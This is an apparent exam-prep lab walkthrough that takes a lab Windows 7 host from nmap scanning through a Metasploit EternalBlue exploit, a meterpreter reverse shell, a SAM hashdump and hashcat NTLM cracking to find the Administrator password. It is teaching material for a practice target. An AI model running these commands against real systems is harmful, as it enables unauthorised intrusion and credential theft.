# Scenario 01 — SMB EternalBlue to Domain Admin

**Difficulty:** 🟡 | **Time:** ~25 min | **Domains:** 02 Scanning, 03 Enumeration, 04 Vuln Analysis, 05 System Hacking, 18 Cryptography
**Tools:** [nmap](../../tools/nmap.md), [enum4linux](../../tools/enum4linux.md), [metasploit](../../tools/metasploit.md), [hashcat](../../tools/hashcat.md), [hashid](../../tools/hashid.md)

## Story
You are given target `10.10.10.7` (Windows 7). Find the cleartext password of the local `Administrator` account.

## Step 1 — Recon (Scanning)
**What we're doing:** find open ports + services.
```bash
nmap -sV -sC -p- -T4 -Pn -oA full 10.10.10.7
```
**Expected finding:** 135/msrpc, 139/netbios-ssn, 445/microsoft-ds, OS = Windows 7 Professional 7601 SP1.
**→ Tool ref:** [nmap -sV / -sC](../../tools/nmap.md#scan-techniques)

## Step 2 — Vuln check (SMB)
**What we're doing:** confirm MS17-010.
```bash
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.7
```
**Expected finding:** `VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)`.
**→ Tool ref:** [nmap NSE smb-vuln-*](../../tools/nmap.md#nse-scripts-the-money-section)

## Step 3 — Exploit (System Hacking)
**What we're doing:** pop a SYSTEM shell via EternalBlue.
```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.7
set LHOST tun0
set payload windows/x64/meterpreter/reverse_tcp
exploit
```
**Expected finding:** meterpreter session as `NT AUTHORITY\SYSTEM`.
**→ Tool ref:** [metasploit EternalBlue](../../tools/metasploit.md)

## Step 4 — Dump hashes
**What we're doing:** pull the SAM.
```bash
meterpreter > hashdump
```
**Expected finding:** line like `Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::` — copy the NT hash (the second half after the last colon before `:::`).
**→ Tool ref:** [metasploit post modules](../../tools/metasploit.md)

## Step 5 — Identify + crack
**What we're doing:** confirm hash type, crack.
```bash
echo '31d6cfe0d16ae931b73c59d7e0c089c0' > nt.hash
hashid nt.hash
hashcat -m 1000 -a 0 nt.hash /usr/share/wordlists/rockyou.txt
```
**Expected finding:** cracked line `31d6cfe0...:<password>`.
**→ Tool refs:** [hashid](../../tools/hashid.md), [hashcat -m 1000 NTLM](../../tools/hashcat.md)

## Step 6 — Final answer
**Answer format:** plaintext Administrator password (e.g. `P@ssw0rd123`).

## Gotchas across this chain
- EternalBlue frequently BSODs Win7 — if exploit fails, rerun once, then try `auxiliary/admin/smb/ms17_010_command`.
- `hashdump` needs SYSTEM — if you land as a user, `getsystem` first.
- Hashcat mode is `1000` for raw NTLM, `1800` for `$6$` Linux sha512crypt — don't confuse them.
- If hashcat says "exhausted", try `--rules=best64` or switch to `rockyou2.txt`.
- Empty NT hash `31d6cfe0d16ae931b73c59d7e0c089c0` means blank password — answer is literally empty.

## Variant questions this scenario teaches you to handle
- "Find the SMB version on 10.10.10.7" → step 1 alone.
- "What CVE is the host vulnerable to?" → step 2 alone, answer `CVE-2017-0144` / `MS17-010`.
- "What is the NTLM hash of Administrator?" → steps 1–4.
- "Crack this NTLM hash" → step 5 alone.
